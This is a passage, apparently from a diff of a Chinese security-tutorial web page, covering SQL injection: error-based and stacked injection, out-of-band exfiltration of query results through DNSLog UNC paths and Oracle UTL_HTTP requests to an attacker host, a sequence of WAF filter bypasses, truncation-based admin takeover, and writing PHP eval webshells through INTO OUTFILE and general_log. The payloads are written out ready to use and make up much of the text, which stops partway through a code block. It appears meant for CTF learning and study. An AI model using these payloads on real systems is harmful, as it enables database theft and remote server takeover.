+</span><span class="w"></span><span class="o">//</span><span class="mi">1060</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Duplicate</span><span class="w"> </span><span class="k">column</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="s1">&#39;5.7.23&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">Time</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">.</span><span class="mi">000000</span><span class="n">s</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h4 id="63-demo">6.3 Demo</h4>
+<p><a href="http://ctf5.shiyanbar.com/web/baocuo/index.php" target="_blank" rel="noopener noreffer">http://ctf5.shiyanbar.com/web/baocuo/index.php</a></p>
+<p><strong>payload</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">version</span><span class="p">())),</span><span class="mi">0</span><span class="p">)</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">ctf5</span><span class="p">.</span><span class="n">shiyanbar</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">web</span><span class="o">/</span><span class="n">baocuo</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="w">
+</span><span class="w"></span><span class="err">$</span><span class="k">sql</span><span class="o">=</span><span class="s2">&#34;    select * from users where username=&#39;&#39; and updatexml /*&#39; and password=&#39;*/(1,concat(0x7e,(version())),0) or &#39;1&#39; &#34;</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h2 id="7-堆叠注入">7 堆叠注入</h2>
+<p>一堆 SQL 语句(多条)一起执行</p>
+<p>在 MySQL 中，主要是命令行中，每条语句结尾加 <code>;</code> 表示语句结束。这样可以考虑多条 SQL 语句一起使用</p>
+<div class="details admonition question open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw"></i>问题<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>堆叠注入和 UNION 注入的差别是？</p>
+<p>UNION 执行的语句类型是有限的，只可以用来执行查询语句</p>
+<p>而堆叠注入可以执行任意语句</p>
+<p>注意：场景少；但是<strong>威力大</strong></p>
+</div>
+        </div>
+    </div>
+<p>并不是每一个环境下都可以执行，很可能受 API 或者数据库引擎不支持的限制，同时权限不足也是面临的主要问题</p>
+<p>在真实环境中：</p>
+<ol>
+<li>通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的</li>
+<li>在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息</li>
+</ol>
+<p>在 PHP - MySQL 中相关的 API</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$query</span>  <span class="o">=</span> <span class="s2">&#34;SELECT CURRENT_USER();&#34;</span><span class="p">;</span>
+<span class="nv">$query</span> <span class="o">.=</span> <span class="s2">&#34;SELECT Name FROM City ORDER BY ID LIMIT 20, 5&#34;</span><span class="p">;</span>
+
+<span class="cm">/* 批量执行查询 */</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">multi_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">do</span> <span class="p">{</span>
+        <span class="cm">/* store first result set */</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span> <span class="o">=</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">store_result</span><span class="p">())</span> <span class="p">{</span>
+            <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">fetch_row</span><span class="p">())</span> <span class="p">{</span>
+                <span class="nx">printf</span><span class="p">(</span><span class="s2">&#34;%s</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+            <span class="p">}</span>
+            <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">free</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="cm">/* print divider */</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">more_results</span><span class="p">())</span> <span class="p">{</span>
+            <span class="nx">printf</span><span class="p">(</span><span class="s2">&#34;-----------------</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">next_result</span><span class="p">());</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="8-oob-注入">8 OOB 注入</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">攻击类别</th>
+<th style="text-align:center">SQL 注入类型</th>
+<th style="text-align:center">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">INBAND</td>
+<td style="text-align:center">报错注入、UNION 注入</td>
+<td style="text-align:center">在应用内直接获取数据，通用过应用返回或者报错直接提取数据</td>
+</tr>
+<tr>
+<td style="text-align:center">INFERENCE</td>
+<td style="text-align:center">布尔注入、时间盲注</td>
+<td style="text-align:center">通过应用的非直接数据反馈进行推断</td>
+</tr>
+<tr>
+<td style="text-align:center">OUT OF BAND</td>
+<td style="text-align:center">OOB SQL 注入</td>
+<td style="text-align:center">通过其它信道获取数据</td>
+</tr>
+</tbody>
+</table>
+<h3 id="81-带外通道技术定义---out-of-band">8.1 带外通道技术定义 - Out Of Band</h3>
+<blockquote>
+<p>带外通道技术(OOB)让攻击者能够通过另一种方式来确认和利用没有直接回显的漏洞。</p>
+</blockquote>
+<p>这一类漏洞中，攻击者无法通过恶意请求直接在响应包中看到漏洞的输出结果。</p>
+<p>带外通道技术通常需要脆弱的实体来生成带外的 TCP/UDP/ICMP 请求，然后，攻击者可以通过这个请求来提取数据。</p>
+<p>一次成功的 OOB 攻击是基于：</p>
+<ol>
+<li>存在漏洞的系统</li>
+<li>外围防火墙的出站请求</li>
+</ol>
+<h3 id="82-oob-vs-x">8.2 OOB vs. X</h3>
+<h4 id="821-oob-vs-inband">8.2.1 OOB vs. Inband</h4>
+<p><strong>常规通信信道</strong></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210106122749.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210106122749.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210106122749.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210106122749.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210106122749.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210106122749.png-water_print" /></p>
+<p><strong>非应用内信道</strong></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210106122834.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210106122834.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210106122834.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210106122834.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210106122834.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210106122834.png-water_print" /></p>
+<h4 id="822-oob-vs-time-based-blind-injection">8.2.2 OOB vs. Time-based Blind Injection</h4>
+<ol>
+<li>可以看作是另一种盲注技术</li>
+<li>与盲注相比，速度具有优势，因为其实际上实现了变相的回显</li>
+</ol>
+<h3 id="83-oob-利用函数---load_file-函数">8.3 OOB 利用函数 - load_file 函数</h3>
+<p>load_file 函数是 MySQL 中一个常用的函数，主要用来读取文件内容。</p>
+<p>函数原型：load_file(file_path)</p>
+<p>该函数会读取文件内容，并将文件内容作为字符串返回。如果读取失败会返回 null</p>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>信息<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">该函数在执行过程中需要遵循 secure_file_priv 的限制，如果直接执行，在读取目标文件内容时会失败。</div>
+        </div>
+    </div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210106151849.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210106151849.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210106151849.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210106151849.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210106151849.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210106151849.png-water_print" /></p>
+<p>secure_file_priv 变量的值为 <code>/var/lib/mysql-files</code>，因此 <code>load_file()</code> 函数只能够去读该目录下的文件内容</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210106152333.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210106152333.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210106152333.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210106152333.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210106152333.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210106152333.png-water_print" /></p>
+<div class="details admonition note open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-pencil-alt fa-fw"></i>注意<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">如果想完成任意目录下文件读取需要在 <code>/etc/my.conf(my.ini)</code> 中将 <code>secure_file_priv</code> 的值置为空</div>
+        </div>
+    </div>
+<h3 id="84-oob-注入原理">8.4 OOB 注入原理</h3>
+<p>在 windows 下，利用 load_file 函数可以读取 UNC 路径的特性，把注入产生的信息来放到 UNC 地址中，通过 DNSLog，将数据带出</p>
+<div class="details admonition example open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-list-ol fa-fw"></i>示例<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">select load_file(concat(&quot;\\\\&quot;, (select database()), &ldquo;.xxx.ceye.io\\abc&rdquo;))</div>
+        </div>
+    </div>
+<h3 id="85-扩展---大文本传输">8.5 扩展 - 大文本传输</h3>
+<p><strong>域名长度限制</strong></p>
+<p>域名由标签组成，以 <code>.</code> 分割，标签的长度不可以超过 63 个字符</p>
+<p>整个域名不可以超过 253 个字符，包括 <code>.</code></p>
+<p><strong>思路</strong></p>
+<ol>
+<li>使用 load_file 读取文件内容</li>
+<li>使用 substr 对文件内容进行切片</li>
+<li>使用 to_base64 对切片的内容进行编码</li>
+<li>使用 concat 将编码后的内容与域名进行拼接</li>
+<li>使用 load_file 访问该 UNC</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="n">concat</span><span class="p">(</span><span class="n">to_base64</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="n">load_file</span><span class="p">(</span><span class="s2">&#34;xxx&#34;</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">15</span><span class="p">)),</span><span class="w"> </span><span class="s2">&#34;dnslog.com&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="k">result</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw"></i>技巧<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>oracle 数据库中，存在发起 HTTP 请求的函数 UTL_HTTP.request</p>
+<p><code>UTL_HTTP.request(url, proxy)</code></p>
+<p>它的返回类型是长度为 2000 或更短的字符串，它包含从 HTTP 请求返回到参数 URL 的 HTML 结果的前 2000 个字节</p>
+<p>通过 SQL 注入让目标服务器执行：</p>
+<p><code>select UTL_HTTP.request('http://IP/test.php'||'?id='||(select version from v$instance)) from dual; </code></p>
+<p>在攻击人员的 test.php 上记录 id 参数传递过来的数据，并写入文件中</p>
+</div>
+        </div>
+    </div>
+<h2 id="9-waf-绕过">9 WAF 绕过</h2>
+<h3 id="91-and-和-or-绕过">9.1 and 和 or 绕过</h3>
+<p>过滤代码：<code>preg_match('/(and|or)/i', $id)</code></p>
+<p>绕过：利用 <code>||</code> 代替 <code>or</code>，<code>&amp;&amp;</code> 代替 <code>and</code></p>
+<h3 id="92-union-过滤绕过">9.2 union 过滤绕过</h3>
+<p>过滤代码：<code>preg_match('/(and|or|union)/i', $id)</code></p>
+<p>绕过：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">user_id</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><div class="details admonition question open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw"></i>问题<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">怎么知道 user 表、user 列、admin 字段？</div>
+        </div>
+    </div>
+<ol>
+<li>表名确实可以猜解，尤其是 user 这种常用表</li>
+<li>如果猜不到，通过 <code>information_schema.tables</code> 及 <code>substr</code> 来联合判断</li>
+<li>列名和字段内容也是同理</li>
+</ol>
+<h3 id="93-where-过滤绕过">9.3 where 过滤绕过</h3>
+<p>过滤代码：<code>preg_match('/(and|or|union|where)/i', $id)</code></p>
+<p>绕过：<code>|| (select user from users limit 1,1)='admin'</code></p>
+<h3 id="94-limit-过滤绕过">9.4 limit 过滤绕过</h3>
+<p>过滤代码：<code>preg_match('/(and|or|union|where|limit)/i', $id)</code></p>
+<p>绕过：<code>|| (select min(user) from group by user_id having user_id=1 ='admin'</code></p>
+<h3 id="95-group-by-过滤绕过">9.5 group by 过滤绕过</h3>
+<p>过滤代码：<code>preg_match('/(and|or|union|where|limit|group by)/i', $id)</code></p>
+<p>绕过：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="o">||</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">substr</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="n">name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">test</span><span class="p">),</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="s1">&#39;t&#39;</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h3 id="96-select-及单引号过滤绕过">9.6 select 及单引号过滤绕过</h3>
+<p>过滤代码：<code>preg_match('/(and|or|union|where|limit|group by|select|\')/i', $id)</code></p>
+<p>绕过：</p>
+<p>布尔盲注不需要 select</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="o">||</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="mi">0</span><span class="n">x74</span><span class="w">
+</span><span class="w"></span><span class="o">||</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="n">unhex</span><span class="p">(</span><span class="mi">74</span><span class="p">)</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h3 id="97-hexunhex-及-substr-过滤绕过---binary">9.7 hex、unhex 及 substr 过滤绕过 - binary</h3>
+<p>过滤代码：<code>preg_match('/(and|or|union|where|limit|group by|select|\'|hex|unhex|substr)/i', $id)</code></p>
+<p>绕过：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="o">||</span><span class="w"> </span><span class="nb">binary</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x74657374</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h3 id="98-空格过滤绕过">9.8 空格过滤绕过</h3>
+<p>过滤代码：<code>preg_match('/(and|or|union|where|limit|group by|select|\'|hex|unhex|substr|\s)/i', $id)</code></p>
+<p>绕过：注释符代替空格</p>
+<h3 id="99-等号过滤绕过">9.9 等号过滤绕过</h3>
+<p>过滤代码：<code>preg_match('/(and|or|union|where|limit|group by|select|\'|hex|unhex|substr|\s| =)/i', $id)</code></p>
+<p>绕过：利用 <code>like、rlike、regexp、!(username&lt;&gt;&quot;admin&quot;)(table_name&lt;&gt;'ffll44jj')</code> 代替等号</p>
+<h3 id="910-其它类型的绕过">9.10 其它类型的绕过</h3>
+<ul>
+<li>双写绕过</li>
+<li>双重编码绕过</li>
+</ul>
+<h2 id="10-二次注入">10 二次注入</h2>
+<div class="details admonition question open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw"></i>问题<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">用户传递给 WEB 应用的数据不可信，数据库中的数据是否可信？</div>
+        </div>
+    </div>
+<h3 id="101-原理">10.1 原理</h3>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210107093742.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210107093742.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210107093742.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210107093742.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210107093742.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210107093742.png-water_print" /></p>
+<h2 id="11-基于约束的-sql-攻击">11 基于约束的 SQL 攻击</h2>
+<h3 id="111-原理">11.1 原理</h3>
+<ol>
+<li>在 INSERT 中，SQL 会根据 varchar(n) 来限制字符串的最大长度。如果字符串的长度大于 n 个字符的话，那么仅使用字符串的前 n 个字符。</li>
+<li>在 SQL 中执行字符串处理时，字符串末尾的空格符将会被删除(结合上面的这里应该就可以构造出payload了)。但也有特殊情况，比如 LIKE。</li>
+</ol>
+<div class="details admonition question open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw"></i>问题<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>假设现在数据库的一个表里已经有了 admin 用户，且用户名 varchar(30)</p>
+<p>再插入一个 <strong>admin(25个空格) 1</strong></p>
+<p>因为限制长度 30 位，所以会只存入前 30 位 这样就可以创建 admin 用户</p>
+</div>
+        </div>
+    </div>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="k">values</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;admin  长度超过表字段的限制被截断   1&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="p">);</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h3 id="112-实例">11.2 实例</h3>
+<p>尝试注册新用户，发现只有 admin 才能获取 flag：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108150430.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108150430.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108150430.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108150430.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108150430.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108150430.png-water_print" /></p>
+<p>通过注册页面发现 admin 用户已存在：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108150444.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108150444.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108150444.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108150444.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108150444.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108150444.png-water_print" /></p>
+<p>在 burpsuite 中修改注册数据包，将 username 字段改为如图所示的<strong>空格 + 字符</strong>的形式：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108151141.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108151141.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108151141.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108151141.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108151141.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108151141.png-water_print" /></p>
+<p>以 admin 身份登录，获取 flag：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108151256.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108151256.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108151256.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108151256.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108151256.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108151256.png-water_print" /></p>
+<h2 id="12-sql-注入命令执行">12 SQL 注入命令执行</h2>
+<h3 id="121-sql-注入写文件">12.1 SQL 注入写文件</h3>
+<p>通过 SQL 注入，直接写入 webshell 文件到服务器，通过 GET 方法或者 POST 方法提交并执行外部指令，为后续进一步远程控制，提权，创造条件。</p>
+<div class="details admonition note open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-pencil-alt fa-fw"></i>注意<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">需要 mysql 用户在写入文件夹下有写入权限，即 <code>secure_file_priv</code> 为不为空。</div>
+        </div>
+    </div>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw"></i>技巧<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>当<code>secure_file_priv</code> 不为空时，可以使用 general_log 写文件：</p>
+<p><code>set global general_log=on;</code></p>
+<p><code>set global general_log_file='C:/phpStudy/WWW/789.php';</code></p>
+<p><code>select '&lt;?php eval($_POST['a']) ?&gt;';</code></p>
+</div>
+        </div>
+    </div>
+<h4 id="1211-union-select-后写入">12.1.1 union select 后写入</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="s2">&#34;1&#34;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="k">null</span><span class="p">,</span><span class="s1">&#39;&lt;?php @eval($_REQUEST[1]);?&gt;&#39;</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">outfile</span><span class="w"> </span><span class="s1">&#39;/var/www/html/cmd.php&#39;</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p><strong>注意</strong>：在 windows 下的分隔符为 /（斜杠）。</p>
+<h4 id="1212-行分隔符写入">12.1.2 行分隔符写入</h4>
+<p>通过 select 语句查询的内容写入文件，也就是 into outfile &lsquo;C:/wamp64/www/work/webshell.php&rsquo; 这样写的原因，然后利用 lines terminated by 语句拼接 webshell 的内容。</p>
+<p>lines terminated by 可以理解为「以每行终止的位置添加 xx 内容」。</p>
+<p>利用 lines starting by 语句拼接webshell的内容。lines starting by 可以理解为「以每行开始的位置添加 xx 内容」。</p>
+<p>利用 fields terminated by 语句拼接webshell的内容。fields terminated by 可以理解为「以每个字段的位置添加 xx 内容」。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="o">//</span><span class="w"> </span><span class="n">lines</span><span class="w"> </span><span class="n">terminated</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="err">写入</span><span class="w">
